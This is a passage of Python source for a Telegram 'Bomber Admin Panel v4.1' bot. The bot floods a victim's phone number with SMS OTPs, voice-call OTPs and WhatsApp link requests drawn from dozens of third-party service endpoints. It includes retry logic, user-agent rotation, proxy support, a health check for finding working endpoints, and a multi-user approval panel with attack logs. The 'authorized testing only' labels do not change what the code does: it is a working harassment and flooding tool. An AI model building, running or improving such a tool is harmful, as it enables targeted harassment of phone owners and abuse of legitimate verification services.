                    link["url"], headers=headers, timeout=timeout,
                    proxy=proxy, ssl=False, allow_redirects=True, max_redirects=3
                ) as resp:
                    status = resp.status
                    await resp.read()
                    # wa.me redirects to api.whatsapp.com which returns 200 or 302
                    ok = status in (200, 301, 302, 303, 307, 308)
                    if ok:
                        log.info(f"💬 {link['name']:20s} → ✅ {status}")
                        await stats.add("wa", True)
                    else:
                        log.info(f"💬 {link['name']:20s} → ❌ {status}")
                        await stats.add("wa", False, f"HTTP {status}")
                    return

            except asyncio.TimeoutError:
                log.warning(f"💬 {link['name']:20s} → Timeout (attempt {attempt+1})")
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(0.5 * (attempt + 1))
                    continue
                await stats.add("wa", False, "Timeout")
            except aiohttp.ClientConnectorError as e:
                log.warning(f"💬 {link['name']:20s} → ConnErr: {str(e)[:30]}")
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(0.5)
                    continue
                await stats.add("wa", False, f"ConnErr")
            except Exception as e:
                err_msg = f"{type(e).__name__}: {repr(e)[:40]}"
                log.warning(f"💬 {link['name']:20s} → {err_msg}")
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(0.5)
                    continue
                await stats.add("wa", False, err_msg)


async def run_attack(phone: str, mode: str = "all", rounds: int = 3,
                     delay: float = 0.5, proxy: str = None,
                     wa_rounds: int = 5, callback=None,
                     db: Database = None) -> AttackStats:
    """
    Run the full bombardment attack with fixed connection handling.

    FIXED v4.1:
    - Proper timeout config (connect + sock_read + total)
    - Retry logic for transient failures
    - repr() for exception logging instead of empty str()
    - Connection pool tuning (TTL, DNS cache)
    - Health tracking in database
    """
    stats = AttackStats()
    sem = asyncio.Semaphore(MAX_CONCURRENCY)

    # FIXED: Proper connector with DNS cache + cleanup
    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENCY,
        limit_per_host=10,
        ttl_dns_cache=120,          # DNS cache TTL
        enable_cleanup_closed=True,  # Clean closed connections
        force_close=False,           # Keep-alive for perf
        ssl=False,                  # No SSL verification
    )

    async with aiohttp.ClientSession(connector=connector) as session:
        for r in range(rounds):
            tasks = []
            log.info(f"═══ Round {r+1}/{rounds} ═══")

            if mode in ("sms", "all"):
                random.shuffle(SMS_SERVICES)
                for svc in SMS_SERVICES:
                    tasks.append(hit_service(svc, phone, session, stats, sem, proxy, db))

            if mode in ("call", "all"):
                random.shuffle(CALL_SERVICES)
                for svc in CALL_SERVICES:
                    tasks.append(hit_service(svc, phone, session, stats, sem, proxy, db))

            if mode in ("whatsapp", "all"):
                wa_links = build_whatsapp_links(phone, rounds=wa_rounds)
                random.shuffle(wa_links)
                # Limit to 8 per round for safety
                for link in wa_links[:8]:
                    tasks.append(hit_whatsapp(link, session, stats, sem, proxy))

            # Batch execute with controlled concurrency
            batch_size = 50
            for i in range(0, len(tasks), batch_size):
                batch = tasks[i:i+batch_size]
                await asyncio.gather(*batch, return_exceptions=True)

            # Progress callback
            if callback:
                try:
                    await callback(f"🔄 Round {r+1}/{rounds} complete\n{stats.summary()}")
                except:
                    pass

            if r < rounds - 1 and delay > 0:
                await asyncio.sleep(delay)

    return stats


# ═══════════════════════════════════════════════════════════════════════════════
# ENDPOINT HEALTH TEST — New /test command
# ═══════════════════════════════════════════════════════════════════════════════

async def test_endpoint(svc: Service, phone: str, session: aiohttp.ClientSession,
                        sem: asyncio.Semaphore) -> Dict:
    """Test a single endpoint and return its status."""
    async with sem:
        url = svc.url
        if svc.param_template is None and '{}' in svc.url:
            url = svc.url.format(phone)

        headers = svc.headers.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        headers["Accept"] = "*/*"
        headers["Connection"] = "keep-alive"

        data = None
        if svc.method == "POST" and svc.param_name:
            payload = {svc.param_name: svc.param_template.format(phone) if svc.param_template else phone}
            if svc.payload_extra:
                payload.update(svc.payload_extra)
            if svc.is_form or "form-urlencoded" in headers.get("Content-Type", ""):
                data = urllib.parse.urlencode(payload)
            else:
                data = json.dumps(payload)

        try:
            timeout = aiohttp.ClientTimeout(total=8, connect=5)
            async with session.request(
                svc.method, url, data=data, headers=headers,
                timeout=timeout, ssl=False
            ) as resp:
                status = resp.status
                await resp.read()
                ok = status in (200, 201, 202, 204, 301, 302)
                return {"name": svc.name, "cat": svc.category, "status": status, "ok": ok}
        except asyncio.TimeoutError:
            return {"name": svc.name, "cat": svc.category, "status": "TIMEOUT", "ok": False}
        except Exception as e:
            return {"name": svc.name, "cat": svc.category, "status": f"ERR:{type(e).__name__}", "ok": False}


async def run_endpoint_test(phone: str = "9999999999") -> Dict[str, Any]:
    """Test all endpoints and return categorized results."""
    connector = aiohttp.TCPConnector(limit=30, limit_per_host=5, ssl=False)
    sem = asyncio.Semaphore(20)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for svc in SERVICES:
            tasks.append(test_endpoint(svc, phone, session, sem))

        results = await asyncio.gather(*tasks, return_exceptions=True)

    working = [r for r in results if isinstance(r, dict) and r["ok"]]
    failed = [r for r in results if isinstance(r, dict) and not r["ok"]]
    errors = [r for r in results if not isinstance(r, dict)]

    # Group by category
    by_cat = defaultdict(list)
    for r in working:
        by_cat[r["cat"]].append(r)

    return {
        "total": len(results),
        "working": working,
        "failed": failed,
        "errors": errors,
        "by_category": dict(by_cat),
        "working_count": len(working),
        "failed_count": len(failed),
        "categories": dict((k, len(v)) for k, v in by_cat.items()),
    }


# ═══════════════════════════════════════════════════════════════════════════════
# TELEGRAM BOT — Professional Admin Panel
# ═══════════════════════════════════════════════════════════════════════════════

TELEGRAM_BOT_AVAILABLE = False
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
    TELEGRAM_BOT_AVAILABLE = True
except ImportError:
    log.warning("python-telegram-bot not installed. Install: pip install python-telegram-bot --upgrade")


class BomberBot:
    """Telegram bot admin panel — v4.1 with health testing."""

    def __init__(self, token: str, db: Database):
        self.token = token
        self.db = db
        self.app = None
        self.active_attacks: Dict[int, asyncio.Task] = {}
        self.broadcast_in_progress = False

    def is_owner(self, user_id: int) -> bool:
        return user_id == OWNER_ID

    def is_admin(self, user_id: int) -> bool:
        if self.is_owner(user_id): return True
        user = self.db.get_user(user_id)
        return user and user["status"] == "approved"

    def is_banned(self, user_id: int) -> bool:
        user = self.db.get_user(user_id)
        return user and user["status"] == "banned"

    async def ensure_user(self, update: Update):
        user = update.effective_user
        self.db.add_user(user.id, user.username or "", user.first_name or "")

    # ── KEYBOARDS ──

    def main_menu_kb(self, user_id: int) -> InlineKeyboardMarkup:
        kb = [
            [InlineKeyboardButton("💣 SMS OTP Bomb", callback_data="mode_sms"),
             InlineKeyboardButton("💬 WhatsApp Flood", callback_data="mode_whatsapp")],
            [InlineKeyboardButton("📞 Voice Call Bomb", callback_data="mode_call"),
             InlineKeyboardButton("⚡ ALL MODES", callback_data="mode_all")],
            [InlineKeyboardButton("📊 My Stats", callback_data="my_stats"),
             InlineKeyboardButton("🔄 Health Test", callback_data="health_test"),
             InlineKeyboardButton("❓ Help", callback_data="help")],
        ]
        if self.is_owner(user_id):
            kb.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
        return InlineKeyboardMarkup(kb)

    def admin_panel_kb(self) -> InlineKeyboardMarkup:
        kb = [
            [InlineKeyboardButton("👥 Users", callback_data="admin_users"),
             InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
             InlineKeyboardButton("⚙ Settings", callback_data="admin_settings")],
            [InlineKeyboardButton("📜 Attack Logs", callback_data="admin_logs"),
             InlineKeyboardButton("🔄 Pending Approvals", callback_data="admin_pending"),
             InlineKeyboardButton("🏥 Endpoint Health", callback_data="admin_health")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")],
        ]
        return InlineKeyboardMarkup(kb)

    def user_list_kb(self, users: List[Dict], page: int = 0, per_page: int = 8) -> InlineKeyboardMarkup:
        kb = []
        start = page * per_page
        for u in users[start:start+per_page]:
            icon = "✅" if u["status"] == "approved" else "⏳" if u["status"] == "pending" else "🚫"
            label = f"{icon} {u['user_id']} (@{u['username'] or '?'})"
            kb.append([InlineKeyboardButton(label, callback_data=f"user_{u['user_id']}")])
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("⬅ Prev", callback_data=f"users_page_{page-1}"))
        if start + per_page < len(users):
            nav.append(InlineKeyboardButton("Next ➡", callback_data=f"users_page_{page+1}"))
        if nav: kb.append(nav)
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_panel")])
        return InlineKeyboardMarkup(kb)

    def user_action_kb(self, uid: int, status: str) -> InlineKeyboardMarkup:
        kb = []
        if status == "pending":
            kb.append([InlineKeyboardButton("✅ Approve", callback_data=f"approve_{uid}")])
        if status != "banned":
            kb.append([InlineKeyboardButton("🚫 Ban", callback_data=f"ban_{uid}")])
        if status == "banned":
            kb.append([InlineKeyboardButton("🔄 Unban", callback_data=f"unban_{uid}")])
        if status == "approved":
            kb.append([InlineKeyboardButton("⏳ Set Pending", callback_data=f"pending_{uid}")])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_users")])
        return InlineKeyboardMarkup(kb)

    def settings_kb(self) -> InlineKeyboardMarkup:
        auto = self.db.get_setting("auto_approve", "false")
        b_only = self.db.get_setting("broadcast_only_approved", "true")
        health = self.db.get_setting("enable_endpoint_health", "true")
        kb = [
            [InlineKeyboardButton(f"{'✅' if auto=='true' else '❌'} Auto-Approve Users",
                                  callback_data="toggle_auto_approve")],
            [InlineKeyboardButton(f"{'✅' if b_only=='true' else '❌'} Broadcast Only Approved",
                                  callback_data="toggle_broadcast_only")],
            [InlineKeyboardButton(f"{'✅' if health=='true' else '❌'} Endpoint Health Tracking",
                                  callback_data="toggle_endpoint_health")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
        ]
        return InlineKeyboardMarkup(kb)

    def round_selector_kb(self, mode: str) -> InlineKeyboardMarkup:
        kb = [
            [InlineKeyboardButton("1 Round (Quick)", callback_data=f"rounds_{mode}_1")],
            [InlineKeyboardButton("3 Rounds (Standard)", callback_data=f"rounds_{mode}_3")],
            [InlineKeyboardButton("5 Rounds (Heavy)", callback_data=f"rounds_{mode}_5")],
            [InlineKeyboardButton("10 Rounds (MAX)", callback_data=f"rounds_{mode}_10")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]
        return InlineKeyboardMarkup(kb)

    # ── COMMAND HANDLERS ──

    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self.ensure_user(update)
        user = update.effective_user
        msg = (
            f"🔥 *Bomber Admin Panel v4.1* 🔥\n"
            f"👑 *Owner:* {OWNER_USERNAME}\n\n"
            f"📌 *Commands:*\n"
            f"├ `/start` — Menu\n"
            f"├ `/bomb <phone> <mode> <rounds>` — Quick attack\n"
            f"├ `/test` — Endpoint health check\n"
            f"├ `/stats` — Your stats\n"
            f"├ `/help` — Help\n\n"
            f"📱 Modes: `sms`, `whatsapp`, `call`, `all`\n"
            f"🔐 Authorized testing only"
        )
        await update.message.reply_text(msg, parse_mode="Markdown",
                                         reply_markup=self.main_menu_kb(user.id))

    async def cmd_bomb(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self.ensure_user(update)
        user_id = update.effective_user.id

        if self.is_banned(user_id):
            await update.message.reply_text("🚫 Banned.")
            return
        if not self.is_admin(user_id):
            await update.message.reply_text(f"⏳ Pending approval. Contact {OWNER_USERNAME}")
            return

        args = context.args
        if len(args) < 1:
            await update.message.reply_text("Usage: `/bomb <phone> <mode> <rounds>`\n"
                                            "Ex: `/bomb 9876543210 all 3`", parse_mode="Markdown")
            return

        phone = args[0].strip()
        if not phone.isdigit() or len(phone) != 10:
            await update.message.reply_text("❌ Invalid number. Enter 10 digits.")
            return

        mode = args[1].strip().lower() if len(args) > 1 else "all"
        if mode not in ("sms", "whatsapp", "call", "all"): mode = "all"
        rounds = int(args[2]) if len(args) > 2 and args[2].isdigit() else 3
        rounds = min(rounds, 20)

        await update.message.reply_text(
            f"⚡ *Launching* ⚡\n📱 `+91-{phone}`\n🎯 `{mode.upper()}`\n🔄 `{rounds}` rounds",
            parse_mode="Markdown")

        progress_msg = await update.message.reply_text("🔄 Starting...")

        async def cb(status: str):
            try: await progress_msg.edit_text(f"⏳ {status}")
            except: pass

        try:
            stats = await run_attack(phone, mode=mode, rounds=rounds, callback=cb, db=self.db)
            self.db.log_attack(user_id, phone, mode, rounds,
                               stats.sms_ok+stats.wa_ok+stats.call_ok,
                               stats.sms_fail+stats.wa_fail+stats.call_fail)
            await progress_msg.edit_text(f"✅ *Complete!*\n\n{stats.detailed()}",
                                          parse_mode="Markdown",
                                          reply_markup=self.main_menu_kb(user_id))
        except Exception as e:
            await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")

    async def cmd_test(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Test all endpoints and show which ones work."""
        await self.ensure_user(update)
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await update.message.reply_text("⏳ Pending approval.")
            return

        msg = await update.message.reply_text("🔄 Testing all endpoints... (this takes ~30s)")
        try:
            result = await run_endpoint_test()
            working = result["working_count"]
            failed = result["failed_count"]
            total = result["total"]

            text = (
                f"🏥 *Endpoint Health Results*\n\n"
                f"📊 Total: `{total}` | ✅ Working: `{working}` | ❌ Dead: `{failed}`\n\n"
                f"*By Category:*\n"
            )
            for cat, count in sorted(result["categories"].items()):
                text += f"├ {cat}: `{count}` working\n"

            text += f"\n✅ *{working}/{total} endpoints functional*"
            await msg.edit_text(text, parse_mode="Markdown",
                                reply_markup=self.main_menu_kb(user_id))
        except Exception as e:
            await msg.edit_text(f"❌ Error: {str(e)[:100]}")

    async def cmd_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self.ensure_user(update)
        user_id = update.effective_user.id
        user = self.db.get_user(user_id)
        if not user:
            await update.message.reply_text("No stats.")
            return
        history = self.db.get_attack_history(user_id, limit=5)
        hist = ""
        for h in history[:5]:
            hist += f"├ 📱 {h['phone']} | {h['mode'].upper()} | ✅{h['success_count']} ❌{h['fail_count']}\n"
        if not hist: hist = "├ No attacks yet.\n"
        await update.message.reply_text(
            f"📊 *Your Stats*\n├ 🆔 `{user['user_id']}`\n├ 📋 `{user['status']}`\n"
            f"├ 🎯 Attacks: `{user['attacks_count']}`\n├ ──────────\n{hist}",
            parse_mode="Markdown")

    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self.ensure_user(update)
        await update.message.reply_text(
            f"❓ *Help*\n👑 {OWNER_USERNAME}\n\n"
            f"`/start` — Menu\n`/bomb <phone> <mode> <rounds>` — Attack\n"
            f"`/test` — Check working endpoints\n`/stats` — Your stats\n\n"
            f"Modes: `sms`, `whatsapp`, `call`, `all`\n"
            f"Indian numbers only (10 digits)",
            parse_mode="Markdown")

    # ── CALLBACK HANDLER ──

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        # ── Main Menu ──
        if data == "main_menu":
            await query.edit_message_text(
                f"🔥 *Bomber Admin Panel* 🔥\n👑 {OWNER_USERNAME}",
                parse_mode="Markdown", reply_markup=self.main_menu_kb(user_id))
            return

        if data == "help":
            await query.edit_message_text(
                f"❓ *Help*\n👑 {OWNER_USERNAME}\n\n"
                f"*Attack Modes:*\n├ SMS — 55+ Indian service OTPs\n"
                f"├ WhatsApp — wa.me deep-link flood\n├ Voice Call — Call OTP services\n"
                f"├ All — Everything combined\n\n📱 Indian numbers only\n🔐 Authorized testing only",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]))
            return

        if data == "my_stats":
            user = self.db.get_user(user_id)
            if not user:
                await query.edit_message_text("No stats.")
                return
            history = self.db.get_attack_history(user_id, limit=5)
            hist = ""
            for h in history[:5]:
                hist += f"├ 📱 {h['phone']} | {h['mode'].upper()} | ✅{h['success_count']} ❌{h['fail_count']}\n"
            if not hist: hist = "├ No attacks.\n"
            await query.edit_message_text(
                f"📊 *Your Stats*\n├ 🆔 `{user['user_id']}`\n├ 📋 `{user['status']}`\n"
                f"├ 🎯 Attacks: `{user['attacks_count']}`\n├ ──────────\n{hist}",
                parse_mode="Markdown", reply_markup=self.main_menu_kb(user_id))
            return

        # ── Health Test (inline) ──
        if data == "health_test":
            await query.edit_message_text("🔄 Testing endpoints... ⏳")
            try:
                result = await run_endpoint_test()
                w = result["working_count"]
                f = result["failed_count"]
                t = result["total"]
                cats = "\n".join([f"├ {c}: `{n}` working" for c, n in sorted(result["categories"].items())])
                await query.edit_message_text(
                    f"🏥 *Endpoint Health*\n📊 `{t}` total | ✅ `{w}` | ❌ `{f}`\n\n{cats}",
                    parse_mode="Markdown", reply_markup=self.main_menu_kb(user_id))
            except Exception as e:
                await query.edit_message_text(f"❌ {str(e)[:80]}",
                                               reply_markup=self.main_menu_kb(user_id))
            return

        # ── Mode Selection ──
        if data.startswith("mode_"):
            mode = data.split("_", 1)[1]
            await query.edit_message_text(f"🎯 Mode: *{mode.upper()}*\n\nRounds?",
                                           parse_mode="Markdown",
                                           reply_markup=self.round_selector_kb(mode))
            return

        if data.startswith("rounds_"):
            parts = data.split("_")
            mode = parts[1]; rounds = int(parts[2])
            context.user_data["attack_mode"] = mode
            context.user_data["attack_rounds"] = rounds
            context.user_data["waiting_phone"] = True
            await query.edit_message_text(
                f"📱 *Enter phone number*\nMode: `{mode.upper()}` | Rounds: `{rounds}`\n\n"
                f"Send 10-digit number (e.g. `9876543210`)",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]]))
            return

        # ── Admin ──
        if data == "admin_panel":
            if not self.is_owner(user_id): return
            await query.edit_message_text("👑 *Admin Panel*", parse_mode="Markdown",
                                           reply_markup=self.admin_panel_kb())
            return

        if data == "admin_stats":
            if not self.is_owner(user_id): return
            tu = self.db.get_user_count()
            ap = self.db.get_user_count("approved")
            pd = self.db.get_user_count("pending")
            bn = self.db.get_user_count("banned")
            at = self.db.get_total_attacks()
            ot = self.db.get_total_otps_sent()
            bc = self.db.get_broadcast_stats()
            health_data = self.db.get_endpoint_health()
            working_endpoints = len([h for h in health_data if h.get("last_status", 0) in (200, 201, 202, 301, 302)])
            await query.edit_message_text(
                f"📊 *Bot Stats*\n\n👥 Users: `{tu}` (✅{ap} ⏳{pd} 🚫{bn})\n"
                f"🎯 Attacks: `{at}` | OTPs: `{ot}`\n"
                f"📢 Broadcasts: `{bc['total']}`\n"
                f"🏥 Endpoints: `{working_endpoints}/{len(SERVICES)}` working\n"
                f"👑 {OWNER_USERNAME}",
                parse_mode="Markdown", reply_markup=self.admin_panel_kb())
            return

        if data == "admin_health":
            if not self.is_owner(user_id): return
            health = self.db.get_endpoint_health()
            if not health:
                await query.edit_message_text("No health data yet. Run an attack or use /test.",
                                               reply_markup=self.admin_panel_kb())
                return
            # Show worst 10
            text = "🏥 *Endpoint Health (worst first)*\n\n"
            for h in health[:10]:
                s = h.get("last_status", "?")
                icon = "✅" if s in (200, 201, 202) else "❌"
                w = h.get("working_count", 0)
                f = h.get("fail_count", 0)
                text += f"{icon} `{h['name']:20s}` → HTTP {s} (W:{w} F:{f})\n"
            await query.edit_message_text(text, parse_mode="Markdown",
                                           reply_markup=self.admin_panel_kb())
            return

        if data == "admin_users":
            if not self.is_owner(user_id): return
            users = self.db.get_all_users()
            await query.edit_message_text(f"👥 *Users ({len(users)})*", parse_mode="Markdown",
                                           reply_markup=self.user_list_kb(users, 0))
            return

        if data.startswith("users_page_"):
            if not self.is_owner(user_id): return
            page = int(data.split("_")[2])
            users = self.db.get_all_users()
            await query.edit_message_text(f"👥 *Users ({len(users)})* — Page {page+1}",
                                           parse_mode="Markdown",
                                           reply_markup=self.user_list_kb(users, page))
            return

        if data.startswith("user_"):
            if not self.is_owner(user_id): return
            target_id = int(data.split("_")[1])
            u = self.db.get_user(target_id)
            if not u:
                await query.edit_message_text("Not found.", reply_markup=self.admin_panel_kb())
                return
            await query.edit_message_text(
                f"👤 *User*\n├ 🆔 `{u['user_id']}`\n├ 👤 @{u['username'] or '?'}\n"
                f"├ 📋 *{u['status']}*\n├ 🎯 Attacks: `{u['attacks_count']}`\n"
                f"├ 📅 Joined: `{u['joined_at']}`",
                parse_mode="Markdown", reply_markup=self.user_action_kb(target_id, u['status']))
            return

        if data.startswith("approve_"):
            target_id = int(data.split("_")[1])
            self.db.update_status(target_id, "approved")
            await query.edit_message_text(f"✅ User `{target_id}` approved!", parse_mode="Markdown",
                                           reply_markup=self.admin_panel_kb())
            return
        if data.startswith("ban_"):
            target_id = int(data.split("_")[1])
            self.db.update_status(target_id, "banned")
            await query.edit_message_text(f"🚫 User `{target_id}` banned!", parse_mode="Markdown",
                                           reply_markup=self.admin_panel_kb())
            return
        if data.startswith("unban_"):
            target_id = int(data.split("_")[1])
            self.db.update_status(target_id, "pending")
            await query.edit_message_text(f"🔄 User `{target_id}` unbanned!", parse_mode="Markdown",
                                           reply_markup=self.admin_panel_kb())
            return
        if data.startswith("pending_"):
            target_id = int(data.split("_")[1])
            self.db.update_status(target_id, "pending")
            await query.edit_message_text(f"⏳ User `{target_id}` set to pending!", parse_mode="Markdown",
                                           reply_markup=self.admin_panel_kb())
            return

        if data == "admin_pending":
            if not self.is_owner(user_id): return
            pending = self.db.get_all_users("pending")
            if not pending:
                await query.edit_message_text("✅ No pending!", reply_markup=self.admin_panel_kb())
                return
            text = "⏳ *Pending:*\n"
            for u in pending:
                text += f"├ 🆔 `{u['user_id']}` — @{u['username'] or '?'}\n"
            await query.edit_message_text(text, parse_mode="Markdown",
                                           reply_markup=self.admin_panel_kb())
            return

        if data == "admin_logs":
            if not self.is_owner(user_id): return
            logs = self.db.get_attack_history(limit=15)
            if not logs:
                await query.edit_message_text("No logs.", reply_markup=self.admin_panel_kb())
                return
            text = "📜 *Recent Attacks:*\n"
            for l in logs[:15]:
                text += f"├ 🆔 `{l['user_id']}` → 📱{l['phone']} | {l['mode'].upper()} | ✅{l['success_count']} ❌{l['fail_count']}\n"
            await query.edit_message_text(text, parse_mode="Markdown",
                                           reply_markup=self.admin_panel_kb())
            return

        if data == "admin_settings":
            if not self.is_owner(user_id): return
            await query.edit_message_text("⚙ *Settings*", parse_mode="Markdown",
                                           reply_markup=self.settings_kb())
            return

        if data == "toggle_auto_approve":
            cur = self.db.get_setting("auto_approve", "false")
            self.db.set_setting("auto_approve", "false" if cur == "true" else "true")
            await query.edit_message_text(f"✅ Toggled", reply_markup=self.settings_kb())
            return
        if data == "toggle_broadcast_only":
            cur = self.db.get_setting("broadcast_only_approved", "true")
            self.db.set_setting("broadcast_only_approved", "false" if cur == "true" else "true")
            await query.edit_message_text(f"✅ Toggled", reply_markup=self.settings_kb())
            return
        if data == "toggle_endpoint_health":
            cur = self.db.get_setting("enable_endpoint_health", "true")
            self.db.set_setting("enable_endpoint_health", "false" if cur == "true" else "true")
            await query.edit_message_text(f"✅ Toggled", reply_markup=self.settings_kb())
            return

        if data == "admin_broadcast":
            if not self.is_owner(user_id): return
            context.user_data["broadcast_mode"] = True
            await query.edit_message_text(
                "📢 *Broadcast*\n\nSend the message. Use Markdown.\n`/cancel` to abort.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
            return

    # ── MESSAGE HANDLER ──

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self.ensure_user(update)
        user_id = update.effective_user.id
        text = update.message.text.strip()

        if text == "/cancel":
            context.user_data.clear()
            await update.message.reply_text("❌ Cancelled.", reply_markup=self.main_menu_kb(user_id))
            return

        # ── Phone Input ──
        if context.user_data.get("waiting_phone"):
            phone = text
            if not phone.isdigit() or len(phone) != 10:
                await update.message.reply_text("❌ Invalid. 10 digits only.")
                return

            mode = context.user_data.get("attack_mode", "all")
            rounds = context.user_data.get("attack_rounds", 3)
            context.user_data["waiting_phone"] = False

            await update.message.reply_text(f"⚡ *Launching* ⚡\n📱 `+91-{phone}`\n🎯 `{mode.upper()}`\n🔄 `{rounds}`",
                                             parse_mode="Markdown")
            progress_msg = await update.message.reply_text("🔄 Starting...")

            async def cb(status: str):
                try: await progress_msg.edit_text(f"⏳ {status}")
                except: pass

            try:
                stats = await run_attack(phone, mode=mode, rounds=rounds, callback=cb, db=self.db)
                self.db.log_attack(user_id, phone, mode, rounds,
                                   stats.sms_ok+stats.wa_ok+stats.call_ok,
                                   stats.sms_fail+stats.wa_fail+stats.call_fail)
                await progress_msg.edit_text(f"✅ *Complete!*\n\n{stats.detailed()}",
                                              parse_mode="Markdown",
                                              reply_markup=self.main_menu_kb(user_id))
            except Exception as e:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            return

        # ── Broadcast ──
        if context.user_data.get("broadcast_mode") and self.is_owner(user_id):
            await self._do_broadcast(update, context, text)
            return

        await update.message.reply_text("Use /start for menu.", reply_markup=self.main_menu_kb(user_id))

    async def _do_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
        user_id = update.effective_user.id
        if self.broadcast_in_progress:
            await update.message.reply_text("⏳ Already broadcasting.")
            return
        self.broadcast_in_progress = True
        context.user_data["broadcast_mode"] = False

        status_msg = await update.message.reply_text("📢 Broadcasting...")
        users = self.db.get_all_users()
        only_app = self.db.get_setting("broadcast_only_approved", "true") == "true"
        sent = 0; failed = 0

        for u in users:
            if only_app and u["status"] != "approved": continue
            try:
                await context.bot.send_message(chat_id=u["user_id"], text=text, parse_mode="Markdown",
                                                disable_web_page_preview=True)
                sent += 1
            except:
                failed += 1
            await asyncio.sleep(0.04)

        self.db.log_broadcast(user_id, text, sent, failed)
        self.broadcast_in_progress = False
        await status_msg.edit_text(
            f"📢 *Broadcast Done*\n├ ✅ Sent: `{sent}`\n├ ❌ Failed: `{failed}`",
            parse_mode="Markdown", reply_markup=self.admin_panel_kb())

    async def handle_error(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        log.error(f"Update error: {context.error}")

    async def auto_approve_check(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.db.get_setting("auto_approve", "false") == "true":
            uid = update.effective_user.id
            if not self.is_owner(uid):
                user = self.db.get_user(uid)
                if user and user["status"] == "pending":
                    self.db.update_status(uid, "approved")
                    log.info(f"Auto-approved user {uid}")

    def run(self):
        if not TELEGRAM_BOT_AVAILABLE:
            log.error("python-telegram-bot not installed.")
            return

        self.app = Application.builder().token(self.token).build()
        self.app.add_handler(CommandHandler("start", self.cmd_start))
        self.app.add_handler(CommandHandler("bomb", self.cmd_bomb))
        self.app.add_handler(CommandHandler("test", self.cmd_test))
        self.app.add_handler(CommandHandler("stats", self.cmd_stats))
        self.app.add_handler(CommandHandler("help", self.cmd_help))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        self.app.add_error_handler(self.handle_error)

        log.info(f"🚀 Bomber Admin Panel v4.1")
        log.info(f"👑 Owner: {OWNER_USERNAME}")
        log.info(f"📱 Endpoints: {len(SERVICES)} ({len(SMS_SERVICES)} SMS, {len(CALL_SERVICES)} Call)")
        log.info(f"✅ Bot running! Press Ctrl+C to stop.")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES)


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{C.R}
╔════════════════════════════════════════════════════════════════╗
║{C.Y}  ★ BOMBER ADMIN PANEL v4.1 — FIXED ★{C.R}                    ║
║{C.G}  SMS • WhatsApp • Voice Call • Broadcast • Multi-User{C.R}     ║
║{C.BL}  👑 {OWNER_USERNAME}{C.R}                                      ║
║{C.Y}  🔐 For Authorized Security Testing Only{C.R}                ║
╚════════════════════════════════════════════════════════════════╝{C.N}
""")

    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print(f"{C.R}[!] Set BOT_TOKEN in the script!{C.N}")
        sys.exit(1)

    if OWNER_ID == 0:
        print(f"{C.Y}[!] Warning: OWNER_ID not set. Get it from @userinfobot{C.N}")
        print(f"{C.Y}[i] Set OWNER_ID = <your_numeric_id> in the script{C.N}")

    db = Database()
    print(f"{C.G}[✓] DB: {DB_PATH}{C.N}")

    if OWNER_ID != 0:
        db.add_user(OWNER_ID, OWNER_USERNAME.lstrip('@'), "Owner")
        db.update_status(OWNER_ID, "approved")
        print(f"{C.G}[✓] Owner pre-approved: {OWNER_USERNAME}{C.N}")

    print(f"{C.G}[✓] {len(SERVICES)} services ({len(SMS_SERVICES)} SMS, {len(CALL_SERVICES)} Call){C.N}")
    print(f"{C.G}[✓] WhatsApp: follow-redirect flood engine{C.N}")
    print(f"{C.G}[✓] Retry: {MAX_RETRIES}x | Timeout: {REQUEST_TIMEOUT}s | Concurrency: {MAX_CONCURRENCY}{C.N}\n")

    bot = BomberBot(BOT_TOKEN, db)
    bot.run()


if __name__ == "__main__":
    main()